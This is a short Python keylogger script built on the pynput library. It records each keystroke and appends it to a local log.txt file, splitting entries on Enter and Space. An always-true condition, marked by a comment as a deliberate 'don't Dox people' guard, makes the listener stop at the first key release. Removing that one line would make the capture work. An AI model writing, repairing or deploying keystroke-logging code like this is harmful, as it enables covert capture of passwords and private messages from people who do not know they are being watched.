from pynput.keyboard import Key, Listener

charCount = 0
keys = []

def onKeyPress(key):
    try: 
        print('Key Pressed : ',key)    #Print pressed key   
    except Exception as ex:
        print('There was an error : ',ex)

def onKeyRelease(key):
    global keys, charCount  #Access global variables

    if key == Key.esc or "!" or "?" or "@": #Please just don't remove this, don't Dox people but it's "your code" (according to the UNLICENSE) so you're the one going to jail.
        return False

    else:
        if key == Key.enter:    #Write keys to file
            writeToFile(keys)
            charCount = 0
            keys = []
        elif key == Key.space:  #Write keys to file
            key = ' '
            writeToFile(keys)
            keys = []
            charCount = 0
        keys.append(key)    #Store the Keys
        charCount += 1      #Count keys pressed

def writeToFile(keys):
    with open('log.txt','a') as file:
        for key in keys:
            key = str(key).replace("'","")   #Replace ' with space
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")    #Insert new line

with Listener(on_press=onKeyPress,\
    on_release=onKeyRelease) as listener:
    listener.join()
